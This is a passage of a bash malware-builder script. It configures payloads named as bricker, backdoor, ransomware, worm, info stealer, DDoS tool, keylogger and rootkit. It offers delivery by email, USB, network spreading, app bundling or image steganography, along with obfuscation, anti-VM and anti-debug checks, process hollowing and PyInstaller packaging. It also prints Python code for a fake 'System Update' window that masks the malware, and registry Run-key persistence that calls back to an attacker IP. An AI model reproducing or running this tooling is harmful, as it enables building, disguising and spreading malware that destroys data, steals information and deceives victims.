        echo -e "${Y}[*] Auto-execution will be disabled for this payload.${NC}"
        log_message "INFO" "Auto-execution disabled"
    fi

    # Fake GUI configuration
    echo -e "\n${B}APPEARANCE CONFIGURATION:${NC}"
    read -p "Enable Fake GUI (Social Engineering)? [Y/n]: " fake_gui
    FAKE_GUI_ENABLED=true
    if [[ "$fake_gui" =~ ^[Nn]$ ]]; then
        FAKE_GUI_ENABLED=false
    fi
    
    if [ "$FAKE_GUI_ENABLED" = true ]; then
        echo -e "${Y}[*] Payload will show a fake 'System Update' window to hide execution.${NC}"
        log_message "INFO" "Fake GUI enabled"
    else
        echo -e "${Y}[*] Payload will run silently (no window).${NC}"
        log_message "INFO" "Fake GUI disabled"
    fi

    read -p "Keep build files for debugging? [y/N]: " KEEP_BUILD_FILES
    KEEP_BUILD_FILES=${KEEP_BUILD_FILES:-"false"}
    if [[ "$KEEP_BUILD_FILES" =~ ^[Yy]$ ]]; then
        KEEP_BUILD_FILES="true"
        log_message "INFO" "User chose to keep build files"
    else
        KEEP_BUILD_FILES="false"
        log_message "INFO" "User chose not to keep build files"
    fi

    # Delivery configuration
    echo -e "\n${B}DELIVERY CONFIGURATION:${NC}"
    echo "1) Email Delivery"
    echo "2) USB Drive Preparation"
    echo "3) Web Server Hosting"
    echo "4) Network Distribution"
    echo "5) Social Engineering Kit"
    echo "6) Application Bundling"
    echo "7) Cloudflare Tunnel (Secure Remote Access)"
    echo "8) Image Steganography (Hide in Image)"
    echo "9) Skip Delivery (Generate Only)"
    
    while true; do
        read -p "Select delivery method: " delivery_choice
        if [[ "$delivery_choice" =~ ^[1-9]$ ]]; then
            if [ "$delivery_choice" -eq 9 ]; then
                DELIVERY_METHOD=""
                log_message "INFO" "Skipping delivery configuration"
                break
            else
                DELIVERY_METHOD="${DELIVERY_METHODS[$delivery_choice]}"
                log_message "INFO" "Delivery method selected: $DELIVERY_METHOD"
                break
            fi
        else
            echo -e "${R}[!] Invalid delivery method. Please enter a number between 1-9.${NC}"
        fi
    done

    if [ -n "$DELIVERY_METHOD" ]; then
        case "$DELIVERY_METHOD" in
            "email")
                read -p "Enter recipient email (comma-separated for multiple): " DELIVERY_TARGETS
                ;;
            "usb")
                read -p "Enter USB device path (e.g., /dev/sdb1): " DELIVERY_TARGETS
                ;;
            "web")
                read -p "Enter web server directory (e.g., /var/www/html): " DELIVERY_TARGETS
                ;;
            "network")
                read -p "Enter target network range (e.g., 192.168.1.0/24): " DELIVERY_TARGETS
                ;;
            "social_engineering")
                read -p "Enter social engineering template name: " DELIVERY_TARGETS
                ;;
            "bundle")
                read -p "Enter legitimate application to bundle with: " DELIVERY_TARGETS
                ;;
            "cloudflare_tunnel")
                read -p "Enter local port for tunnel [default: $CLOUDFLARE_TUNNEL_PORT]: " tunnel_port
                CLOUDFLARE_TUNNEL_PORT=${tunnel_port:-$CLOUDFLARE_TUNNEL_PORT}
                DELIVERY_TARGETS="$CLOUDFLARE_TUNNEL_PORT"
                CLOUDFLARE_TUNNEL_ENABLED=true
                ;;
            "image_steganography")
                # Image steganography configuration - only when this delivery method is selected
                echo -e "\n${B}IMAGE STEGANOGRAPHY CONFIGURATION:${NC}"
                
                # List available images
                echo -e "\n${Y}Available images:${NC}"
                if [ -d "$IMAGES_DIR" ] && [ "$(ls -A "$IMAGES_DIR" 2>/dev/null)" ]; then
                    local i=1
                    for img in "$IMAGES_DIR"/*.{jpg,jpeg,png,bmp,gif}; do
                        if [ -f "$img" ]; then
                            echo "$i) $(basename "$img")"
                            i=$((i+1))
                        fi
                    done
                    
                    # Allow user to select an image
                    while true; do
                        read -p "Select an image or enter path to a new image: " img_choice
                        if [[ "$img_choice" =~ ^[0-9]+$ ]]; then
                            # User selected from list
                            local selected_img=$(ls "$IMAGES_DIR"/*.{jpg,jpeg,png,bmp,gif} | sed -n "${img_choice}p")
                            if [ -f "$selected_img" ]; then
                                IMAGE_FILE="$selected_img"
                                break
                            else
                                echo -e "${R}[!] Invalid selection. Please try again.${NC}"
                            fi
                        else
                            # User entered a path
                            if [ -f "$img_choice" ]; then
                                IMAGE_FILE="$img_choice"
                                # Copy to images directory for future use
                                cp "$img_choice" "$IMAGES_DIR/"
                                break
                            else
                                echo -e "${R}[!] File not found. Please try again.${NC}"
                            fi
                        fi
                    done
                else
                    # No images available, ask for path
                    while true; do
                        read -p "Enter path to an image file (jpg, jpeg, png, bmp, gif): " img_path
                        if [ -f "$img_path" ]; then
                            IMAGE_FILE="$img_path"
                            # Copy to images directory for future use
                            ensure_dir "$IMAGES_DIR"
                            cp "$img_path" "$IMAGES_DIR/"
                            break
                        else
                            echo -e "${R}[!] File not found. Please try again.${NC}"
                        fi
                    done
                fi
                
                read -p "Enter output filename for steganographic image [default: stego_image.png]: " stego_output
                DELIVERY_TARGETS=${stego_output:-"stego_image.png"}
                
                log_message "INFO" "Image steganography enabled with image: $IMAGE_FILE"
                ;;
        esac
        log_message "INFO" "Delivery targets: $DELIVERY_TARGETS"
    fi

    save_config
}

# Get available payload types including plugins
get_available_payload_types() {
    # Initialize with built-in payload types
    PAYLOAD_LIST=(
        "Bricker (System Destroyer)"
        "Backdoor (Remote Access)"
        "Ransomware (File Encryptor)"
        "Worm (Network Spreader)"
        "Info Stealer (Data Exfiltration)"
        "Network Destroyer (DDoS Tool)"
        "Keylogger (Input Capture)"
        "Rootkit (System Stealth)"
        "Custom Payload Template"
    )
    
    # Add plugin payload types if available
    if [ -d "$PLUGINS_DIR" ]; then
        for plugin in "$PLUGINS_DIR"/*.sh; do
            if [ -f "$plugin" ]; then
                # Extract plugin name from filename
                local plugin_name=$(basename "$plugin" .sh)
                PAYLOAD_LIST+=("$plugin_name (Plugin)")
            fi
        done
    fi
}

# Advanced configuration
advanced_config() {
    echo -e "\n${B}ADVANCED CONFIGURATION:${NC}"
    
    echo -e "${Y}Select encryption algorithm:${NC}"
    for i in "${!ENCRYPTION_ALGORITHMS[@]}"; do
        echo "$i) ${ENCRYPTION_ALGORITHMS[$i]}"
    done
    read -p ">> " enc_choice
    ENCRYPTION_ALGORITHM="${ENCRYPTION_ALGORITHMS[$enc_choice]:-${ENCRYPTION_ALGORITHMS[1]}}"
    
    echo -e "\n${Y}Select obfuscation level:${NC}"
    for i in "${!OBFUSCATION_TECHNIQUES[@]}"; do
        echo "$i) ${OBFUSCATION_TECHNIQUES[$i]}"
    done
    read -p ">> " obs_choice
    OBFUSCATION_LEVEL=$obs_choice
    
    echo -e "\n${Y}Select packing method:${NC}"
    for i in "${!PACKING_METHODS[@]}"; do
        echo "$i) ${PACKING_METHODS[$i]}"
    done
    read -p ">> " pack_choice
    PACKING_METHOD="${PACKING_METHODS[$pack_choice]:-${PACKING_METHODS[1]}}"
    
    read -p "Enable anti-debugging? [Y/n]: " anti_debug
    ANTI_DEBUG_ENABLED=true
    if [[ "$anti_debug" =~ ^[Nn]$ ]]; then
        ANTI_DEBUG_ENABLED=false
    fi
    
    read -p "Enable anti-VM detection? [Y/n]: " anti_vm
    ANTI_VM_ENABLED=true
    if [[ "$anti_vm" =~ ^[Nn]$ ]]; then
        ANTI_VM_ENABLED=false
    fi
    
    read -p "Enable shellcode injection? [Y/n]: " shellcode
    SHELLCODE_INJECTION=true
    if [[ "$shellcode" =~ ^[Nn]$ ]]; then
        SHELLCODE_INJECTION=false
    fi
    
    read -p "Enable process hollowing? [Y/n]: " hollowing
    PROCESS_HOLLOWING=true
    if [[ "$hollowing" =~ ^[Nn]$ ]]; then
        PROCESS_HOLLOWING=false
    fi
    
    read -p "Enable runtime decryption? [Y/n]: " runtime_decrypt
    RUNTIME_DECRYPTION=true
    if [[ "$runtime_decrypt" =~ ^[Nn]$ ]]; then
        RUNTIME_DECRYPTION=false
    fi
    
    # New advanced options
    read -p "Enable progress bars? [Y/n]: " progress_bar
    PROGRESS_BAR_ENABLED=true
    if [[ "$progress_bar" =~ ^[Nn]$ ]]; then
        PROGRESS_BAR_ENABLED=false
    fi
    
    read -p "Enable payload verification? [Y/n]: " verification
    VERIFICATION_ENABLED=true
    if [[ "$verification" =~ ^[Nn]$ ]]; then
        VERIFICATION_ENABLED=false
    fi
    
    log_message "INFO" "Advanced configuration updated"
}

# Configuration save and load
save_config() {
    cat > "$CONFIG_FILE" << EOF
ATTACKER_IP="$ATTACKER_IP"
ATTACKER_PORT="$ATTACKER_PORT"
TARGET_OS="$TARGET_OS"
FINAL_NAME="$FINAL_NAME"
PAYLOAD_TYPE="$PAYLOAD_TYPE"
ENCRYPTION_ALGORITHM="$ENCRYPTION_ALGORITHM"
OBFUSCATION_LEVEL=$OBFUSCATION_LEVEL
PERSISTENCE_METHOD="$PERSISTENCE_METHOD"
ANTI_DEBUG_ENABLED=$ANTI_DEBUG_ENABLED
ANTI_VM_ENABLED=$ANTI_VM_ENABLED
PACKER_ENABLED=$PACKER_ENABLED
PACKING_METHOD="$PACKING_METHOD"
SHELLCODE_INJECTION=$SHELLCODE_INJECTION
PROCESS_HOLLOWING=$PROCESS_HOLLOWING
RUNTIME_DECRYPTION=$RUNTIME_DECRYPTION
AUTO_EXECUTION=$AUTO_EXECUTION
FAKE_GUI_ENABLED=$FAKE_GUI_ENABLED
KEEP_BUILD_FILES=$KEEP_BUILD_FILES
DELIVERY_METHOD="$DELIVERY_METHOD"
DELIVERY_TARGETS="$DELIVERY_TARGETS"
CLOUDFLARE_TUNNEL_ENABLED=$CLOUDFLARE_TUNNEL_ENABLED
CLOUDFLARE_TUNNEL_PORT="$CLOUDFLARE_TUNNEL_PORT"
AUTO_LAUNCH_METHOD="$AUTO_LAUNCH_METHOD"
PROGRESS_BAR_ENABLED=$PROGRESS_BAR_ENABLED
VERIFICATION_ENABLED=$VERIFICATION_ENABLED
EOF
    log_message "INFO" "Configuration saved to $CONFIG_FILE"
}

load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE" 2>/dev/null || log_message "WARNING" "Failed to load configuration file"
        log_message "INFO" "Configuration loaded from $CONFIG_FILE"
        return 0
    fi
    return 1
}

validate_config() {
    local errors=()
    
    ! validate_ip "$ATTACKER_IP" && errors+=("Invalid attacker IP: $ATTACKER_IP")
    ! validate_port "$ATTACKER_PORT" && errors+=("Invalid attacker port: $ATTACKER_PORT")
    
    [ "$TARGET_OS" != "Windows" ] && [ "$TARGET_OS" != "Linux" ] && [ "$TARGET_OS" != "macOS" ] && [ "$TARGET_OS" != "Multi-OS" ] && errors+=("Invalid target OS: $TARGET_OS")
    
    # Validate payload type against available payload types
    get_available_payload_types
    local max_payload_type=${#PAYLOAD_LIST[@]}
    [[ ! "$PAYLOAD_TYPE" =~ ^[0-9]+$ ]] || [ "$PAYLOAD_TYPE" -lt 1 ] || [ "$PAYLOAD_TYPE" -gt "$max_payload_type" ] && errors+=("Invalid payload type: $PAYLOAD_TYPE")
    
    if [ "$DELIVERY_METHOD" = "image_steganography" ] && [ ! -f "$IMAGE_FILE" ]; then
        errors+=("Image steganography selected but image file not found: $IMAGE_FILE")
    fi
    
    if [ ${#errors[@]} -ne 0 ]; then
        echo -e "${R}[!] Configuration validation failed:${NC}"
        for error in "${errors[@]}"; do
            echo -e "${R}    - $error${NC}"
        done
        return 1
    fi
    
    return 0
}

# Enhanced payload generation
generate_payload() {
    local type=$1
    local attacker_ip=$2
    local attacker_port=$3
    local target_os=$4
    local final_name=$5
    
    log_message "INFO" "Generating payload type: $type for $target_os"
    echo -e "${Y}[*] Generating payload for type: $type | Target OS: $target_os${NC}"
    
    if ! validate_config; then
        log_message "ERROR" "Configuration validation failed"
        return 1
    fi
    
    local encryption_key=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
    
    # Get available payload types to determine if this is a plugin
    get_available_payload_types
    local max_payload_type=${#PAYLOAD_LIST[@]}
    
    # Handle multi-OS payload generation
    if [ "$target_os" == "Multi-OS" ]; then
        echo -e "${Y}[*] Generating multi-OS payload with auto-detection...${NC}"
        
        # Create a directory for multi-OS builds
        ensure_dir "../multi_os_builds"
        
        # Generate the multi-OS payload
        if [ "$type" -le 9 ]; then
            # Built-in payload types
            case $type in
                1) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
                2) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
                3) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
                4) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
                5) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
                6) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
                7) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
                8) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
                9) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
            esac
        else
            # Plugin payload types
            local plugin_index=$((type - 10))
            local plugin_files=("$PLUGINS_DIR"/*.sh)
            if [ $plugin_index -lt ${#plugin_files[@]} ]; then
                local plugin_file="${plugin_files[$plugin_index]}"
                log_message "INFO" "Using plugin payload: $(basename "$plugin_file")"
                
                # Source the plugin to get its payload creation function
                source "$plugin_file"
                
                # Call the plugin's payload creation function
                local plugin_name=$(basename "$plugin_file" .sh)
                if declare -f "create_${plugin_name}_payload" > /dev/null; then
                    "create_${plugin_name}_payload" "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os"
                else
                    log_message "ERROR" "Plugin payload function not found: create_${plugin_name}_payload"
                    return 1
                fi
            else
                log_message "ERROR" "Invalid plugin index: $plugin_index"
                return 1
            fi
        fi
        
        [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
        [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
        [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
        
        # Compile for the current platform
        local current_platform=$(detect_platform)
        local pyinstaller_args="--onefile --name=$final_name"
        
        # Use platform-specific compilation options
        if [ "$current_platform" = "Windows" ]; then
            pyinstaller_args="$pyinstaller_args --noconsole --windowed"
        elif [ "$current_platform" = "Linux" ]; then
            # For Linux, check if GUI is enabled
            if [ "$FAKE_GUI_ENABLED" = true ]; then
                # Check if we have X11 display available
                if [ -n "$DISPLAY" ]; then
                    pyinstaller_args="$pyinstaller_args --windowed"
                else
                    # No display available, use console mode
                    pyinstaller_args="$pyinstaller_args --noconsole"
                fi
            else
                pyinstaller_args="$pyinstaller_args --noconsole"
            fi
        elif [ "$current_platform" = "macOS" ]; then
            pyinstaller_args="$pyinstaller_args --noconsole --windowed"
        fi
        
        pyinstaller_args="$pyinstaller_args --strip --clean"
        
        [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
            1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
            2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
            3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
        esac
        
        echo -e "${Y}[*] Compiling to a standalone executable for $current_platform...${NC}"
        
        if pyinstaller $pyinstaller_args payload.py; then
            if [ -f "dist/$final_name" ]; then
                local file_size=$(get_file_size "dist/$final_name")
                local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
                local file_hash=$(sha256sum "dist/$final_name" | cut -d' ' -f1)
                
                echo -e "${G}[+] Success! Multi-OS payload created as 'dist/$final_name' (${size_mb} MB).${NC}"
                
                # Move to multi-OS directory
                mv "dist/$final_name" "../multi_os_builds/"
                
                # Create metadata for the payload
                local metadata_file="../multi_os_builds/${final_name}.meta"
                cat > "$metadata_file" << EOF
Payload Type: $type
Target OS: Multi-OS (Auto-detect)
Build ID: $BUILD_ID
Timestamp: $BUILD_TIMESTAMP
File Size: $file_size bytes
SHA256: $file_hash
Encryption Algorithm: $ENCRYPTION_ALGORITHM
Obfuscation Level: $OBFUSCATION_LEVEL
Persistence Method: $PERSISTENCE_METHOD
Auto-Launch Method: $AUTO_LAUNCH_METHOD
Anti-Debug Enabled: $ANTI_DEBUG_ENABLED
Anti-VM Enabled: $ANTI_VM_ENABLED
Packer Enabled: $PACKER_ENABLED
Packing Method: $PACKING_METHOD
Shellcode Injection: $SHELLCODE_INJECTION
Process Hollowing: $PROCESS_HOLLOWING
Runtime Decryption: $RUNTIME_DECRYPTION
Auto-Execution Enabled: $AUTO_EXECUTION
Fake GUI Enabled: $FAKE_GUI_ENABLED
Delivery Method: $DELIVERY_METHOD

Features:
- Auto-detects target OS on execution
- Executes appropriate payload code for detected OS
- Cross-platform compatibility
EOF
                
                log_message "SUCCESS" "Successfully created multi-OS executable: $final_name (${size_mb} MB, SHA256: $file_hash)"
                
                # Create a summary file
                cat > "../multi_os_builds/README.txt" << EOF
MULTI-OS PAYLOAD BUILD SUMMARY
====================================
Build ID: $BUILD_ID
Timestamp: $BUILD_TIMESTAMP
Payload Type: $type
Auto-Execution Enabled: $AUTO_EXECUTION
Fake GUI Enabled: $FAKE_GUI_ENABLED

Files:
- $final_name: Multi-OS executable with auto-detection

Usage:
Run the executable on any supported platform (Windows, Linux, macOS).
The payload will automatically detect the operating system and execute
the appropriate code for that platform.

Auto-Execution:
If enabled, payload will automatically execute upon installation using
the appropriate persistence method for the detected OS.

Fake GUI:
If enabled, payload will display a fake "System Update" window 
to mask malicious activity and ensure immediate user interaction.

Supported Platforms:
- Windows (Registry, Startup Folder, WMI, Scheduled Tasks, LNK Files, Shell Extensions)
- Linux (Cron, Systemd, Init.d, Profile, Desktop Shortcuts)
- macOS (LaunchAgent, LaunchDaemon, Login Items, Cron, Dock Shortcuts)
EOF
                
                echo -e "${G}[+] Multi-OS build complete!${NC}"
                echo -e "${G}[+] All files are in the 'multi_os_builds' directory.${NC}"
                
                # Verify payload if verification is enabled
                if [ "$VERIFICATION_ENABLED" = true ]; then
                    verify_payload "../multi_os_builds/$final_name"
                fi
                
                log_message "SUCCESS" "Multi-OS build completed"
                return 0
            else
                echo -e "${R}[!] Failed to create multi-OS executable.${NC}"
                log_message "ERROR" "Failed to create multi-OS executable"
                return 1
            fi
        else
            echo -e "${R}[!] PyInstaller compilation failed.${NC}"
            log_message "ERROR" "PyInstaller compilation failed"
            return 1
        fi
    else
        # Single platform payload generation
        if [ "$type" -le 9 ]; then
            # Built-in payload types
            case $type in
                1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
                2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
                3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
                4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
                5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
                6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
                7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
                8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
                9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            esac
        else
            # Plugin payload types
            local plugin_index=$((type - 10))
            local plugin_files=("$PLUGINS_DIR"/*.sh)
            if [ $plugin_index -lt ${#plugin_files[@]} ]; then
                local plugin_file="${plugin_files[$plugin_index]}"
                log_message "INFO" "Using plugin payload: $(basename "$plugin_file")"
                
                # Source the plugin to get its payload creation function
                source "$plugin_file"
                
                # Call the plugin's payload creation function
                local plugin_name=$(basename "$plugin_file" .sh)
                if declare -f "create_${plugin_name}_payload" > /dev/null; then
                    "create_${plugin_name}_payload" "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os"
                else
                    log_message "ERROR" "Plugin payload function not found: create_${plugin_name}_payload"
                    return 1
                fi
            else
                log_message "ERROR" "Invalid plugin index: $plugin_index"
                return 1
            fi
        fi
        
        [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
        [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
        [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
        
        echo -e "${Y}[*] Compiling to a standalone executable for $target_os...${NC}"
        
        local pyinstaller_args="--onefile --name=$final_name"
        
        # Use platform-specific compilation options
        if [ "$target_os" = "Windows" ]; then
            pyinstaller_args="$pyinstaller_args --noconsole --windowed"
        elif [ "$target_os" = "Linux" ]; then
            # For Linux, check if GUI is enabled
            if [ "$FAKE_GUI_ENABLED" = true ]; then
                # Check if we have X11 display available
                if [ -n "$DISPLAY" ]; then
                    pyinstaller_args="$pyinstaller_args --windowed"
                else
                    # No display available, use console mode
                    pyinstaller_args="$pyinstaller_args --noconsole"
                fi
            else
                pyinstaller_args="$pyinstaller_args --noconsole"
            fi
        elif [ "$target_os" = "macOS" ]; then
            pyinstaller_args="$pyinstaller_args --noconsole --windowed"
        fi
        
        pyinstaller_args="$pyinstaller_args --strip --clean"
        
        [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
            1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
            2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
            3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
        esac
        
        if ! pyinstaller $pyinstaller_args payload.py; then
            echo -e "${R}[!] PyInstaller compilation failed.${NC}"
            log_message "ERROR" "PyInstaller compilation failed"
            return 1
        fi

        if [ -f "dist/$final_name" ]; then
            local file_size=$(get_file_size "dist/$final_name")
            local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
            local file_hash=$(sha256sum "dist/$final_name" | cut -d' ' -f1)
            
            echo -e "${G}[+] Success! Payload created as 'dist/$final_name' (${size_mb} MB).${NC}"
            echo -e "${G}[+] SHA256: $file_hash${NC}"
            
            mv "dist/$final_name" ..
            
            local metadata_file="../${final_name}.meta"
            cat > "$metadata_file" << EOF
Payload Type: $type
Target OS: $target_os
Build ID: $BUILD_ID
Timestamp: $BUILD_TIMESTAMP
File Size: $file_size bytes
SHA256: $file_hash
Encryption Algorithm: $ENCRYPTION_ALGORITHM
Obfuscation Level: $OBFUSCATION_LEVEL
Persistence Method: $PERSISTENCE_METHOD
Auto-Launch Method: $AUTO_LAUNCH_METHOD
Anti-Debug Enabled: $ANTI_DEBUG_ENABLED
Anti-VM Enabled: $ANTI_VM_ENABLED
Packer Enabled: $PACKER_ENABLED
Packing Method: $PACKING_METHOD
Shellcode Injection: $SHELLCODE_INJECTION
Process Hollowing: $PROCESS_HOLLOWING
Runtime Decryption: $RUNTIME_DECRYPTION
Auto-Execution Enabled: $AUTO_EXECUTION
Fake GUI Enabled: $FAKE_GUI_ENABLED
Delivery Method: $DELIVERY_METHOD
EOF
            
            log_message "SUCCESS" "Successfully created executable: $final_name (${size_mb} MB, SHA256: $file_hash)"
            
            # Verify payload if verification is enabled
            if [ "$VERIFICATION_ENABLED" = true ]; then
                verify_payload "../$final_name"
            fi
            
            return 0
        else
            echo -e "${R}[!] Failed to create executable. Check for errors above.${NC}"
            log_message "ERROR" "Failed to create executable"
            return 1
        fi
    fi
}

# Payload verification
verify_payload() {
    local payload_path=$1
    
    echo -e "${Y}[*] Verifying payload integrity...${NC}"
    
    if [ ! -f "$payload_path" ]; then
        log_message "ERROR" "Payload file not found: $payload_path"
        return 1
    fi
    
    # Check file size
    local file_size=$(get_file_size "$payload_path")
    if [ $file_size -lt 1024 ]; then
        log_message "WARNING" "Payload file seems too small: $file_size bytes"
        echo -e "${Y}[!] Warning: Payload file seems too small: $file_size bytes${NC}"
    fi
    
    # Check file hash
    local file_hash=$(sha256sum "$payload_path" | cut -d' ' -f1)
    echo -e "${G}[+] Payload SHA256: $file_hash${NC}"
    
    # Check if file is executable
    if [ "$(detect_platform)" != "Windows" ]; then
        if [ -x "$payload_path" ]; then
            echo -e "${G}[+] Payload is executable${NC}"
        else
            echo -e "${Y}[!] Warning: Payload is not executable${NC}"
            log_message "WARNING" "Payload is not executable: $payload_path"
        fi
    fi
    
    # Check for common strings (educational purposes only)
    if command -v strings &> /dev/null; then
        local strings_count=$(strings "$payload_path" | wc -l)
        echo -e "${G}[+] Payload contains $strings_count strings${NC}"
        
        # Check for suspicious strings
        local suspicious_strings=$(strings "$payload_path" | grep -i -c "password\|key\|secret\|token")
        if [ $suspicious_strings -gt 0 ]; then
            echo -e "${Y}[!] Warning: Payload contains $suspicious_strings potentially suspicious strings${NC}"
            log_message "WARNING" "Payload contains potentially suspicious strings: $suspicious_strings"
        fi
    fi
    
    log_message "SUCCESS" "Payload verification completed"
    return 0
}

# Helper function for Fake GUI generation
generate_fake_gui_code() {
    cat << 'GUI_CODE'

import threading
import time
import sys
import os
import platform

def run_fake_gui():
    """Shows a fake 'System Update' window while malware runs in background"""
    try:
        # Platform-specific GUI implementation
        system = platform.system()
        
        if system == "Windows":
            import tkinter as tk
            from tkinter import messagebox
            
            root = tk.Tk()
            root.title("System Update")
            
            # Center window
            screen_width = root.winfo_screenwidth()
            screen_height = root.winfo_screenheight()
            x = (screen_width / 2) - (300 / 2)
            y = (screen_height / 2) - (150 / 2)
            root.geometry(f'300x150+{int(x)}+{int(y)}')
            
            # Prevent resizing
            root.resizable(False, False)
            
            # Create widgets
            label = tk.Label(root, text="Installing Critical Update...", font=("Arial", 10, "bold"))
            label.pack(pady=20)
            
            status = tk.Label(root, text="Please wait while we configure your system.", font=("Arial", 8))
            status.pack(pady=5)
            
            # Schedule window to close after 3 seconds
            root.after(3000, root.destroy)
            
            # Start GUI mainloop
            root.mainloop()
            
        elif system == "Linux":
            # Check if X11 display is available
            if os.environ.get('DISPLAY'):
                try:
                    import tkinter as tk
                    from tkinter import messagebox
                    
                    root = tk.Tk()
                    root.title("System Update")
                    
                    # Center window
                    screen_width = root.winfo_screenwidth()
                    screen_height = root.winfo_screenheight()
                    x = (screen_width / 2) - (300 / 2)
                    y = (screen_height / 2) - (150 / 2)
                    root.geometry(f'300x150+{int(x)}+{int(y)}')
                    
                    # Prevent resizing
                    root.resizable(False, False)
                    
                    # Create widgets
                    label = tk.Label(root, text="Installing Critical Update...", font=("Arial", 10, "bold"))
                    label.pack(pady=20)
                    
                    status = tk.Label(root, text="Please wait while we configure your system.", font=("Arial", 8))
                    status.pack(pady=5)
                    
                    # Schedule window to close after 3 seconds
                    root.after(3000, root.destroy)
                    
                    # Start GUI mainloop
                    root.mainloop()
                except Exception:
                    # If GUI fails, use a terminal-based notification
                    print("\n" + "="*50)
                    print("SYSTEM UPDATE IN PROGRESS")
                    print("Please wait while we configure your system...")
                    print("="*50 + "\n")
                    time.sleep(3)
            else:
                # No display available, use terminal notification
                print("\n" + "="*50)
                print("SYSTEM UPDATE IN PROGRESS")
                print("Please wait while we configure your system...")
                print("="*50 + "\n")
                time.sleep(3)
                
        elif system == "Darwin":  # macOS
            try:
                import tkinter as tk
                from tkinter import messagebox
                
                root = tk.Tk()
                root.title("System Update")
                
                # Center window
                screen_width = root.winfo_screenwidth()
                screen_height = root.winfo_screenheight()
                x = (screen_width / 2) - (300 / 2)
                y = (screen_height / 2) - (150 / 2)
                root.geometry(f'300x150+{int(x)}+{int(y)}')
                
                # Prevent resizing
                root.resizable(False, False)
                
                # Create widgets
                label = tk.Label(root, text="Installing Critical Update...", font=("Arial", 10, "bold"))
                label.pack(pady=20)
                
                status = tk.Label(root, text="Please wait while we configure your system.", font=("Arial", 8))
                status.pack(pady=5)
                
                # Schedule window to close after 3 seconds
                root.after(3000, root.destroy)
                
                # Start GUI mainloop
                root.mainloop()
            except Exception:
                # If GUI fails, use a terminal-based notification
                print("\n" + "="*50)
                print("SYSTEM UPDATE IN PROGRESS")
                print("Please wait while we configure your system...")
                print("="*50 + "\n")
                time.sleep(3)
        else:
            # Unknown system, use terminal notification
            print("\n" + "="*50)
            print("SYSTEM UPDATE IN PROGRESS")
            print("Please wait while we configure your system...")
            print("="*50 + "\n")
            time.sleep(3)
            
    except Exception:
        # If GUI fails, just pass
        pass
GUI_CODE
}

# Multi-OS payload creation function
create_multi_os_payload() {
    local attacker_ip=$1
    local attacker_port=$2
    local encryption_key=$3
    
    cat > payload.py << EOF
#!/usr/bin/env python3
import os
import sys
import time
import platform
import subprocess
import threading
import base64
import tempfile
import shutil

# Auto-execution setup
AUTO_EXECUTION = $AUTO_EXECUTION
FAKE_GUI = $FAKE_GUI_ENABLED
PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
ATTACKER_IP = "$attacker_ip"
ATTACKER_PORT = "$attacker_port"

# Anti-detection
ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
ANTI_VM_ENABLED = $ANTI_VM_ENABLED

# Include Fake GUI logic if enabled
 $(generate_fake_gui_code)

def detect_os():
    """Detect the operating system"""
    system = platform.system()
    
    if system == "Windows":
        return "Windows"
    elif system == "Linux":
        return "Linux"
    elif system == "Darwin":
        return "macOS"
    else:
        return "Unknown"

def setup_persistence_windows():
    """Set up persistence on Windows"""
    if not AUTO_EXECUTION:
        return
    
    try:
        # Get current executable path
        exe_path = os.path.abspath(sys.argv[0])
        
        # Windows persistence based on selected method
        if PERSISTENCE_METHOD == "registry":
            import winreg
            # Add to registry run key
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
                
        elif PERSISTENCE_METHOD == "windows_startup":
            # Copy to Windows Startup folder
